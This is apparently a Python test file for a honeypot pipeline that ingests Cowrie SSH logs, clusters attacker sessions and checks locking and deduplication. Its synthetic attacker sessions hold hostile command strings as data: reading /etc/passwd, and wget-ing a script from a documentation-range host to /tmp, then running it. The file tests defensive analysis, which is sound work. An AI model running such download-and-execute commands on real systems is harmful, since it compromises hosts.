from contextlib import closing, redirect_stdout
import io
import json
from pathlib import Path
import sqlite3
import tempfile
import unittest

from ml.cluster import fit
from ml.pipeline import Locked, run_pipeline, single_instance


def session(sid, ip, cmds, minute):
    ts = lambda s: f'2026-10-28T00:{minute:02d}:{s:02d}Z'
    return [{'session': sid, 'src_ip': ip, 'eventid': 'cowrie.session.connect', 'protocol': 'ssh', 'timestamp': ts(0)}] + [
        {'session': sid, 'src_ip': ip, 'eventid': 'cowrie.command.input', 'input': c, 'timestamp': ts(j + 1)}
        for j, c in enumerate(cmds)]


def recon(i):
    return session(f'recon{i:02d}', f'203.0.113.{i}', ['uname -a', f'cat /etc/passwd; echo {i}'], 0)


def drop(i, minute=0):
    return session(f'drop{i:02d}', f'203.0.113.{100 + i}',
                   [f'cd /tmp; wget http://198.51.100.{i}/x{i}.sh', f'chmod +x x{i}.sh; sh x{i}.sh'], minute)


class LockTests(unittest.TestCase):
    def test_second_holder_is_refused_until_released(self):
        with tempfile.TemporaryDirectory() as tmp:
            lock = Path(tmp, 'pipeline.lock')
            with single_instance(lock):
                with self.assertRaises(Locked):
                    with single_instance(lock):
                        pass
            with single_instance(lock):  # 풀린 뒤에는 다시 잡힌다
                pass


class PipelineRunTests(unittest.TestCase):
    def test_growing_log_runs(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp = Path(tmp)
            logs, db, out, models = tmp / 'syd', tmp / 'h.db', tmp / 'out', tmp / 'models'
            logs.mkdir()
            live = logs / 'cowrie.json'
            events = [e for i in range(15) for e in recon(i) + drop(i)]
            live.write_text('\n'.join(json.dumps(e) for e in events), encoding='utf-8')

            with redirect_stdout(io.StringIO()):
                first = run_pipeline(logs, db, out, models)  # 아직 fit 전이라 assign에서 실패
            self.assertEqual((first['status'], first['step']), ('failed', 'assign'))

            with closing(sqlite3.connect(db)) as con, redirect_stdout(io.StringIO()):
                fit(con, out, models)

            # 같은 파일이 커진다: 새 세션 하나 + 진행 중인 듯한 세션 하나(마지막 이벤트와 같은 시각)
            more = drop(77, minute=30) + drop(78, minute=45)
            live.write_text('\n'.join(json.dumps(e) for e in events + more), encoding='utf-8')
            with redirect_stdout(io.StringIO()):
                second = run_pipeline(logs, db, out, models, settle_minutes=10)
            self.assertEqual(second['status'], 'ok')
            self.assertEqual((second['new_sessions'], second['assigned'], second['pending']), (2, 1, 1))

            with single_instance(out / 'pipeline.lock'), redirect_stdout(io.StringIO()):
                third = run_pipeline(logs, db, out, models)
            self.assertEqual(third['status'], 'skipped')

            with closing(sqlite3.connect(db)) as con:
                n_commands = con.execute('SELECT COUNT(*) FROM commands').fetchone()[0]
            self.assertEqual(n_commands, (15 + 15 + 2) * 2)  # 커진 파일을 다시 넣어도 명령어가 중복되지 않는다

            lines = [json.loads(l) for l in (out / 'runs.log').read_text(encoding='utf-8').splitlines()]
            self.assertEqual([l['status'] for l in lines], ['failed', 'ok', 'skipped'])
            self.assertIn('novel_candidates', lines[1])


if __name__ == '__main__':
    unittest.main()
